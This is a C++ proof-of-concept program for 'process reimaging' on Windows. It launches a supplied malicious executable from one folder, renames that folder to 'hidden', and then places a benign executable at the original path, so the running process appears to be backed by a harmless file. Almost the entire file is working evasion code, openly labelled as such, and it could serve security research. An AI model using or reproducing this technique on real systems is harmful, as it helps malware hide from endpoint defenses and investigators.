// CPPProcessReimagingPOC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>

void usage() {
	std::cout << "Usage:\n";
	std::cout << "\t.\CPPProcessReimagingPOC.exe C:\\Path\\to\\bad.exe C:\\Path\\to\\good.exe\n";
}

inline bool file_exists(const std::string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

int split_path_and_file(std::string fullPath, std::string& filePath, std::string& fileName)
{
	std::size_t lastSlash = fullPath.find_last_of("/\\");
	if (lastSlash == std::string::npos) {
		std::string tmpName(fullPath.begin(), fullPath.end());
		fileName = tmpName;
		filePath = "";
		return 0;
	}

	filePath = fullPath.substr(0, lastSlash);
	fileName = fullPath.substr(lastSlash + 1);
}

// Convert a wide Unicode string to an UTF8 string
std::string utf8_encode(const std::wstring& wstr)
{
	if (wstr.empty()) return std::string();
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

// Convert an UTF8 string to a wide Unicode String
std::wstring utf8_decode(const std::string& str)
{
	if (str.empty()) return std::wstring();
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}



int main(int argc, char* argv[])
{
	if (argc != 3) {
		std::cout << "[-] Error: Not enough arguments.\n";
		usage();
		return 1;
	}
	// We're going to launch badExe and the file backed on disk will be goodExe
	std::string badExe = std::string(argv[1]);
	std::string goodExe = std::string(argv[2]);
	// Ensure files exist
	if (!file_exists(badExe)) {
		std::cout << "[-] " << badExe << " does not exist.\n";
		return 1;
	}
	if (!file_exists(goodExe)) {
		std::cout << "[-] " << goodExe << " does not exist.\n";
		return 1;
	}
	// For this POC, we're going to ensure we create the process from
	// two directories under the executing directory.
	// The "executing" directory is responsible for launching the process,
	// while the "hidden" directory will store the final location of badExe.
	// goodExe will end up under the executing directory as phase1.exe
	wchar_t wCurFullPath[MAX_PATH];
	int bytes = GetModuleFileName(NULL, wCurFullPath, MAX_PATH);
	if (bytes == 0) {
		std::cout << "[-] Couldn't get current executing path.\n";
		return 1;
	}
	std::wstring stdWCurFullPath = std::wstring(wCurFullPath);
	std::string curFullPath = utf8_encode(stdWCurFullPath);
	std::string curExe;
	std::string curPath;
	split_path_and_file(curFullPath, curPath, curExe);
	std::string badExePath;
	std::string badExeName;
	split_path_and_file(badExe, badExePath, badExeName);
	std::cout << "[*] Current module: " << curFullPath << "\n";
	std::cout << "[*] Current path: " << curPath << "\n";
	// The output directories
	std::string executingPath = curPath + "\\executing";
	std::string hiddenPath = curPath + "\\hidden";
	int res = CreateDirectoryA(executingPath.c_str(), NULL);
	if (res == 0 && !(GetLastError() == ERROR_ALREADY_EXISTS)) {
		std::cout << "[-] Error creating directory: " << executingPath << "\n";
		return 1;
	}
	
	std::string fullExecutingPath = executingPath + "\\phase1.exe";
	//std::string fullHiddenPath = hiddenPath + "\\" + badExeName;
	BOOL boolRes = CopyFileA(badExe.c_str(), fullExecutingPath.c_str(), FALSE);
	if (!boolRes) {
		std::cout << "[-] Could not copy " << badExeName << " to " << fullExecutingPath << "\n";
		return 1;
	}
	std::cout << "[*] Copied " << badExeName << " to " << fullExecutingPath << "\n";
	std::cout << "[*] Starting process in executing directory...\n";

	std::wstring wFullExecutingPath = utf8_decode(fullExecutingPath);
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	// Create the process for phase1.exe, which is really badExe.
	res = CreateProcess(NULL, (LPWSTR)wFullExecutingPath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (res == 0) {
		DWORD err = GetLastError();
		std::cout << "[-] Error creating process: " << err << "\n";
		return 1;
	}
	std::cout << "[*] Started " << fullExecutingPath << "\n";
	std::cout << "[*] Moving  phase1.exe (" << badExeName << ") to " << hiddenPath << "\n";

	// Move the executing directory to the hidden directory
	boolRes = MoveFileA(executingPath.c_str(), hiddenPath.c_str());
	if (!boolRes) {
		DWORD err = GetLastError();
		std::cout << "[-] Failed to move file to hidden directory:" << err << "\n";
		return 1;
	}

	// Now need to put goodExe in executing\phase1.exe 
	std::cout << "[*] Copying " << goodExe << " to " << fullExecutingPath << "\n";
	res = CreateDirectoryA(executingPath.c_str(), NULL);
	if (res == 0 && !(GetLastError() == ERROR_ALREADY_EXISTS)) {
		std::cout << "[-] Error creating directory: " << executingPath << "\n";
		return 1;
	}
	boolRes = CopyFileA(goodExe.c_str(), fullExecutingPath.c_str(), TRUE);
	if (!boolRes) {
		std::cout << "[-] Failed to copy file to executing directory.\n";
		return 1;
	}
	std::cout << "[+] All done!\n";
	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
